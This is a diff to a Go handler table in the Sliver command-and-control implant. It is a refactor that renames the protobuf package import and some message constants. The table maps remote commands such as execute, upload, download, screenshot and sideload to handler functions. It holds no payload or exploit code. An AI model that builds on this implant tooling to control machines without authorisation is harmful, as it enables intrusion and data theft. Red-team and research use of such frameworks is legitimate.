@@ -18,33 +18,31 @@ package handlers
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-import ( // {{if .Debug}}
-	// {{else}}{{end}}
-	pb "github.com/bishopfox/sliver/protobuf/sliver"
+import (
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
 var (
 	linuxHandlers = map[uint32]RPCHandler{
-		pb.MsgPsReq:       psHandler,
-		pb.MsgTerminate:   terminateHandler,
-		pb.MsgPing:        pingHandler,
-		pb.MsgLsReq:       dirListHandler,
-		pb.MsgDownloadReq: downloadHandler,
-		pb.MsgUploadReq:   uploadHandler,
-		pb.MsgCdReq:       cdHandler,
-		pb.MsgPwdReq:      pwdHandler,
-		pb.MsgRmReq:       rmHandler,
-		pb.MsgMkdirReq:    mkdirHandler,
-		pb.MsgTask:        taskHandler,
-		pb.MsgRemoteTask:  remoteTaskHandler,
-		pb.MsgIfconfigReq: ifconfigHandler,
-		pb.MsgExecuteReq:  executeHandler,
+		sliverpb.MsgPsReq:         psHandler,
+		sliverpb.MsgTerminate:     terminateHandler,
+		sliverpb.MsgPing:          pingHandler,
+		sliverpb.MsgLsReq:         dirListHandler,
+		sliverpb.MsgDownloadReq:   downloadHandler,
+		sliverpb.MsgUploadReq:     uploadHandler,
+		sliverpb.MsgCdReq:         cdHandler,
+		sliverpb.MsgPwdReq:        pwdHandler,
+		sliverpb.MsgRmReq:         rmHandler,
+		sliverpb.MsgMkdirReq:      mkdirHandler,
+		sliverpb.MsgTaskReq:       taskHandler,
+		sliverpb.MsgRemoteTaskReq: remoteTaskHandler,
+		sliverpb.MsgIfconfigReq:   ifconfigHandler,
+		sliverpb.MsgExecuteReq:    executeHandler,
 
-		pb.MsgScreenshotReq: screenshotHandler,
+		sliverpb.MsgScreenshotReq: screenshotHandler,
 
-		pb.MsgNetstatReq:  netstatHandler,
-		pb.MsgSideloadReq: sideloadHandler,
-
+		sliverpb.MsgNetstatReq:  netstatHandler,
+		sliverpb.MsgSideloadReq: sideloadHandler,
 	}
 )
 
